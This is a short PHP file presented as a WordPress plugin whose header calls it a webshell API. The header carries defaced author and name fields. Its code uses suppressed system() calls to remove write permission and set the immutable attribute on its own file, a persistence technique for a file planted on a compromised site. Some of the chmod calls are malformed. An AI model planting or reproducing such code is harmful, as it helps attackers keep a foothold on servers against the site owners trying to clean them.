<?php
/*
Plugin Name: JEMBOT MAWOT LITESPEED
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Author: Remi Gascou (Podalirius)
Version: 1.1.0
Author URI: BULU JAMBOED
Text Domain: webshell JAMBOED
Domain Path: /languages
License: GPLv3 or later
Network: true
*/
$chunk_size = 1024;
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");
@system("chmod 777 +i $this_file");
@system("chattr +i $this_file");
@system("chmod 444 +i $this_file");
?>
